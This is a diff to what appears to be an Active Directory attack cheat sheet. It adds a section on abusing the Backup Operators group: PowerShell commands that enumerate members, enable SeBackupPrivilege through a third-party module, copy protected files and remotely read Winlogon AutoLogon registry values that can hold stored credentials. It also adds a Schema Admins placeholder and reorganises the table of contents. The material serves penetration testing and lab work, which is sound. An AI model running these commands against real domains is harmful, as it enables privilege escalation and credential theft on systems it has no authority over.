@@ -92,8 +92,11 @@
       - [ADFS - Golden SAML](#adfs---golden-saml)
     - [UnPAC The Hash](#unpac-the-hash)
     - [Shadow Credentials](#shadow-credentials)
-    - [Dangerous Built-in Groups Usage](#dangerous-built-in-groups-usage)
-    - [Abusing DNS Admins Group](#abusing-dns-admins-group)
+    - [Active Directory Groups](#active-directory-groups)
+      - [Dangerous Built-in Groups Usage](#dangerous-built-in-groups-usage)
+      - [Abusing DNS Admins Group](#abusing-dns-admins-group)
+      - [Abusing Schema Admins Group](#abusing-schema-admins-group)
+      - [Abusing Backup Operators Group](#abusing-backup-operators-group)
     - [Abusing Active Directory ACLs/ACEs](#abusing-active-directory-aclsaces)
       - [GenericAll](#genericall)
       - [GenericWrite](#genericwrite)
@@ -2854,6 +2857,7 @@ Using the **UnPAC The Hash** method, you can retrieve the NT Hash for an User vi
   proxychains python3 wmiexec.py -k -no-pass ez.lab/administrator@ws2.ez.lab
   ```
 
+## Active Directory Groups 
 
 ### Dangerous Built-in Groups Usage
 
@@ -2926,6 +2930,42 @@ Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccount
     sc \\dc01 stop dns
     sc \\dc01 start dns
     ```
+
+### Abusing Schema Admins Group
+
+> The Schema Admins group is a security group in Microsoft Active Directory that provides its members with the ability to make changes to the schema of an Active Directory forest. The schema defines the structure of the Active Directory database, including the attributes and object classes that are used to store information about users, groups, computers, and other objects in the directory.
+
+
+### Abusing Backup Operators Group
+
+> Members of the Backup Operators group can back up and restore all files on a computer, regardless of the permissions that protect those files. Backup Operators also can log on to and shut down the computer. This group cannot be renamed, deleted, or moved. By default, this built-in group has no members, and it can perform backup and restore operations on domain controllers.
+
+This groups grants the following privileges :
+- SeBackup privileges
+- SeRestore privileges
+
+* Get members of the group:
+  ```ps1
+  PowerView> Get-NetGroupMember -Identity "Backup Operators" -Recurse
+  ```
+* Enable privileges using [giuliano108/SeBackupPrivilege](https://github.com/giuliano108/SeBackupPrivilege)
+  ```ps1
+  Import-Module .\SeBackupPrivilegeUtils.dll
+  Import-Module .\SeBackupPrivilegeCmdLets.dll
+
+  Set-SeBackupPrivilege
+  Get-SeBackupPrivilege
+  ```
+* Retrieve sensitive files
+  ```ps1
+  Copy-FileSeBackupPrivilege C:\Users\Administrator\flag.txt C:\Users\Public\flag.txt -Overwrite
+  ```
+* Retrieve content of AutoLogon in the HKLM\SOFTWARE hive
+  ```ps1
+  $reg = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey('LocalMachine', 'dc.htb.local',[Microsoft.Win32.RegistryView]::Registry64)
+  $winlogon = $reg.OpenSubKey('SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon')
+  $winlogon.GetValueNames() | foreach {"$_ : $(($winlogon).GetValue($_))"}
+  ```
 
 
 ### Abusing Active Directory ACLs/ACEs
@@ -4192,3 +4232,4 @@ CME          10.XXX.XXX.XXX:445 HOSTNAME-01   [+] DOMAIN\COMPUTER$ 31d6cfe0d16ae
 * [I AM AD FS AND SO CAN YOU - Douglas Bienstock & Austin Baker - Mandiant](https://troopers.de/downloads/troopers19/TROOPERS19_AD_AD_FS.pdf)
 * [Hunt for the gMSA secrets - Dr Nestori Syynimaa (@DrAzureAD) - August 29, 2022](https://aadinternals.com/post/gmsa/)
 * [Relaying NTLM Authentication from SCCM Clients - Chris Thompson - Jun 30, 2022](https://posts.specterops.io/relaying-ntlm-authentication-from-sccm-clients-7dccb8f92867)
+* [Poc’ing Beyond Domain Admin - Part 1 - cube0x0](https://cube0x0.github.io/Pocing-Beyond-DA/)
